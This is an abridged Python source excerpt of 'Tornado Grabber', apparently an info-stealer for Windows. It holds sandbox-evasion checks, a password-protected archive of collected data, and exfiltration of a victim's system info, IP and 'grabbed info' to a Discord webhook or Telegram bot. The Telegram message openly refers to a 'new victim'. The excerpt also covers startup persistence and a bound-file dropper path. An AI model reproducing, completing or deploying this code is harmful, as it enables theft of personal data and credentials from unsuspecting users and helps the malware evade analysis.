# Python 3.10+
# Author: BenzoXdev
# Github: https://github.com/BenzoXdev/Tornado-Grabber
# Encoding: UTF-8
...
Logger = logging.getLogger("Tornado Grabber")
...
class VmProtect:
    ...
    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
        ...
        try:
            http.request('GET', f'https://Tornado-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True
...
class TornadoGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "Tornado123"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Tornado-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://raw.githubusercontent.com/BenzoXdev/Tornado-Grabber/main/.github/workflows/image.png"

                payload = {
                    "content": "||@everyone||" if Settings.PingMe else "",
                    "embeds": [
                        {
                            "title": "Tornado Grabber",
                            "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
                            "url": "https://github.com/BenzoXdev/Tornado-Grabber",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by Tornado Grabber | https://github.com/BenzoXdev/Tornado-Grabber"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Tornado Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.Tornado")):
        try:
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    TornadoGrabber() # Start the grabber
